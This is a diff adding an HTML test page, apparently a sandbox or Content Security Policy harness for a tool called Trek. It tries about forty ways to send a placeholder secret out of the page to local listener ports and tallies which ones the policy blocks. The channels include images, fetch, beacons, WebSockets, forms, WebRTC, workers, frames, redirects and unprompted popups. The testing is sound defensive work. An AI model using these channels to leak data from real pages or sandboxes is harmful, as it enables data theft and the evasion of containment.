@@ -1,0 +1,137 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Ways out of the sandbox</title>
+<link rel="preconnect" href="https://127.0.0.1:47719/">
+<link rel="dns-prefetch" href="https://127.0.0.1:47720/">
+<link rel="prefetch" href="https://127.0.0.1:47721/prefetch">
+<link rel="preload" as="image" href="https://127.0.0.1:47722/preload.png">
+<link rel="modulepreload" href="https://127.0.0.1:47723/module.js">
+<link rel="manifest" href="https://127.0.0.1:47735/manifest.json">
+<link rel="stylesheet" href="https://127.0.0.1:47702/sheet.css">
+<style>
+  @import url("https://127.0.0.1:47703/import.css");
+  @font-face { font-family: Leak; src: url("https://127.0.0.1:47705/font.woff2"); }
+  body { font-size: 13px; }
+  #bg { background: url("https://127.0.0.1:47704/bg.png"); font-family: Leak, var(--trek-font); cursor: url("https://127.0.0.1:47738/cursor.png"), auto; }
+  table { border-collapse: collapse; width: 100%; }
+  td { padding: 1px 8px 1px 0; border-bottom: 1px solid var(--trek-border); white-space: nowrap; }
+  .stopped { color: var(--trek-positive); }
+  .tried { color: var(--trek-negative); font-weight: 600; }
+  .cols { columns: 2; column-gap: 28px; font-size: 12px; }
+  table { break-inside: auto; }
+  tr { break-inside: avoid; }
+  #tally, #libs { margin: 0; height: 20px; line-height: 20px; overflow: hidden; white-space: nowrap; }
+  /* Three targets at fixed places, for a click aimed by its coordinates: each 180 by 24 px,
+     their middles at (106, 72), (296, 72) and (486, 72) of the page. */
+  #bar { position: absolute; left: 16px; top: 60px; height: 24px; display: flex; gap: 10px; }
+  #bar > * { display: block; box-sizing: border-box; width: 180px; height: 24px; line-height: 22px; margin: 0; padding: 0 8px; font: inherit; text-align: center; border: 1px solid var(--trek-border); border-radius: 6px; background: var(--trek-surface); color: var(--trek-fg); text-decoration: none; overflow: hidden; white-space: nowrap; }
+  .cols { margin-top: 44px; }
+</style>
+</head>
+<body>
+<div id="tally">Trying…</div>
+<div id="libs">cdnjs: <b id="lib-cdnjs">waiting</b> · jsdelivr: <b id="lib-jsdelivr">waiting</b></div>
+<div id="bar">
+  <a id="plain" href="https://example.com/plain-link">A link</a>
+  <a id="blank" href="https://example.com/new-window-link" target="_blank">A link to a new window</a>
+  <button id="opens">window.open</button>
+</div>
+<div class="cols"><table id="rows"></table></div>
+<div id="bg">text</div>
+<div id="sink" style="position:absolute;left:-9999px;width:1px;height:1px;overflow:hidden"></div>
+<script>
+  // Each way out goes to its own port on this machine (47700 + its number), over https: a
+  // listener there sees who knocked, and the policy's own report says which were stopped.
+  const POPUPS = __POPUPS__;
+  const BASE = 47700;
+  const WAYS = [
+    [0, 'img'], [1, 'script src'], [2, 'stylesheet'], [3, 'css @import'], [4, 'css background'],
+    [5, 'css font'], [6, 'fetch'], [7, 'XMLHttpRequest'], [8, 'sendBeacon'], [9, 'WebSocket'],
+    [10, 'EventSource'], [11, 'video'], [12, 'audio'], [13, 'iframe https'], [14, 'iframe data:'],
+    [15, 'iframe blob:'], [16, 'iframe srcdoc'], [17, 'object'], [18, 'embed'], [19, 'preconnect'],
+    [20, 'dns-prefetch'], [21, 'prefetch'], [22, 'preload'], [23, 'modulepreload'], [24, 'form'],
+    [25, 'meta refresh'], [26, 'location'], [27, 'window.open'], [28, 'WebRTC'], [29, 'worker fetch'],
+    [30, 'importScripts'], [31, 'import()'], [32, 'svg image'], [33, 'a ping'], [34, 'srcset'],
+    [35, 'manifest'], [36, 'video poster'], [37, 'track'], [38, 'css cursor'], [39, 'blob: page'],
+    [40, 'frame WebRTC'],
+  ];
+  const url = (n, path) => 'https://127.0.0.1:' + (BASE + n) + '/' + (path || 'x') + '?secret=hunter2';
+  const stopped = new Set(), notes = {};
+  document.addEventListener('securitypolicyviolation', (e) => {
+    const m = /:(477\d\d)/.exec(e.blockedURI || '');
+    if (m) stopped.add(Number(m[1]) - BASE);
+    draw();
+  });
+  const draw = () => {
+    const rows = document.getElementById('rows');
+    rows.innerHTML = WAYS.map(([n, name]) => '<tr><td>' + n + '</td><td>' + name + '</td><td class="' + (stopped.has(n) ? 'stopped">stopped' : 'tried">' + (notes[n] || 'no report')) + '</td></tr>').join('');
+    document.getElementById('tally').textContent = stopped.size + ' of ' + WAYS.length + ' stopped by the policy; ask the listener about the rest.';
+  };
+  const note = (n, text) => { notes[n] = text; draw(); };
+  const sink = document.getElementById('sink');
+  const add = (html) => { const d = document.createElement('div'); d.innerHTML = html; sink.appendChild(d); return d; };
+  const attempt = (n, fn) => { try { fn(); } catch (e) { note(n, 'threw: ' + (e && e.name)); } };
+
+  attempt(0, () => { new Image().src = url(0, 'img.png'); });
+  attempt(1, () => { const s = document.createElement('script'); s.src = url(1, 'script.js'); document.head.appendChild(s); });
+  attempt(6, () => { fetch(url(6, 'fetch'), { mode: 'no-cors' }).catch(() => {}); });
+  attempt(7, () => { const x = new XMLHttpRequest(); x.open('POST', url(7, 'xhr')); x.send('secret=hunter2'); });
+  attempt(8, () => { navigator.sendBeacon(url(8, 'beacon'), 'secret=hunter2'); });
+  attempt(9, () => { new WebSocket('wss://127.0.0.1:' + (BASE + 9) + '/ws'); });
+  attempt(10, () => { new EventSource(url(10, 'events')); });
+  attempt(11, () => add('<video src="' + url(11, 'v.mp4') + '" preload="auto" poster="' + url(36, 'poster.png') + '"><track src="' + url(37, 't.vtt') + '" default></video>'));
+  attempt(12, () => add('<audio src="' + url(12, 'a.mp3') + '" preload="auto"></audio>'));
+  attempt(13, () => add('<iframe src="' + url(13, 'frame') + '"></iframe>'));
+  const inner = (n) => '<img src="' + url(n, 'inner.png') + '">';
+  attempt(14, () => add('<iframe src="data:text/html,' + encodeURIComponent(inner(14)) + '"></iframe>'));
+  attempt(15, () => { const f = document.createElement('iframe'); f.src = URL.createObjectURL(new Blob([inner(15)], { type: 'text/html' })); sink.appendChild(f); });
+  attempt(16, () => { const f = document.createElement('iframe'); f.srcdoc = inner(16); sink.appendChild(f); });
+  attempt(17, () => add('<object data="' + url(17, 'object') + '"></object>'));
+  attempt(18, () => add('<embed src="' + url(18, 'embed') + '">'));
+  attempt(24, () => { const f = add('<form method="post" action="' + url(24, 'form') + '" target="formsink"><input name="secret" value="hunter2"></form><iframe name="formsink"></iframe>').querySelector('form'); f.submit(); });
+  attempt(32, () => add('<svg width="4" height="4"><image href="' + url(32, 'svg.png') + '" width="4" height="4"/></svg>'));
+  attempt(33, () => { const a = add('<a href="#here" ping="' + url(33, 'ping') + '">p</a>').querySelector('a'); a.click(); });
+  attempt(34, () => add('<img srcset="' + url(34, 'set.png') + ' 1x">'));
+  attempt(31, () => { import(url(31, 'module.js')).catch(() => {}); });
+  attempt(29, () => {
+    const code = 'fetch(' + JSON.stringify(url(29, 'worker-fetch')) + ',{mode:"no-cors"}).catch(()=>{});try{importScripts(' + JSON.stringify(url(30, 'worker-import.js')) + ')}catch(e){}';
+    new Worker(URL.createObjectURL(new Blob([code], { type: 'text/javascript' })));
+  });
+  const rtc = (n, w) => {
+    const RTC = w.RTCPeerConnection || w.webkitRTCPeerConnection;
+    if (!RTC) return note(n, 'no RTCPeerConnection here');
+    const pc = new RTC({ iceServers: [{ urls: 'stun:127.0.0.1:' + (BASE + n) }] });
+    pc.createDataChannel('x');
+    pc.createOffer().then((o) => pc.setLocalDescription(o)).then(() => note(n, 'an offer was made: ask the listener (UDP)'), (e) => note(n, 'refused: ' + (e && e.name)));
+  };
+  attempt(28, () => rtc(28, window));
+  // A frame of the page's own making has globals no script of Trek's has touched.
+  attempt(40, () => { const f = document.createElement('iframe'); sink.appendChild(f); rtc(40, f.contentWindow); });
+  // The ones that would take the page away go last, a moment apart.
+  setTimeout(() => attempt(25, () => { const m = document.createElement('meta'); m.httpEquiv = 'refresh'; m.content = '0;url=' + url(25, 'refresh'); document.head.appendChild(m); }), 800);
+  setTimeout(() => attempt(26, () => { location.href = url(26, 'location'); }), 1400);
+  setTimeout(() => attempt(39, () => { location.href = URL.createObjectURL(new Blob(['<title>Away</title>' + inner(39)], { type: 'text/html' })); }), 2000);
+  if (POPUPS) {
+    // No click anywhere: a window asked for as the page loads, by script and by a made-up click.
+    setTimeout(() => attempt(27, () => { const w = window.open('https://example.com/opened-with-no-click?secret=hunter2'); note(27, w ? 'a window came back' : 'no window'); }), 600);
+    setTimeout(() => { document.getElementById('blank').click(); }, 1000);
+  }
+  document.getElementById('opens').addEventListener('click', () => { window.open('https://example.com/opened-by-a-click'); });
+
+  // Libraries: one from a host that loads without asking, one from a host that asks first.
+  const lib = (id, src, ok) => {
+    const s = document.createElement('script');
+    s.src = src;
+    s.onload = () => { document.getElementById(id).textContent = ok() ? 'loaded' : 'loaded, but empty'; };
+    s.onerror = () => { document.getElementById(id).textContent = 'not loaded'; };
+    document.head.appendChild(s);
+  };
+  lib('lib-cdnjs', 'https://cdnjs.cloudflare.com/ajax/libs/dayjs/1.11.13/dayjs.min.js', () => typeof dayjs === 'function');
+  lib('lib-jsdelivr', 'https://cdn.jsdelivr.net/npm/dayjs@1.11.13/plugin/utc.js', () => typeof dayjs_plugin_utc === 'function');
+  draw();
+  setTimeout(draw, 2500);
+</script>
+</body>
+</html>
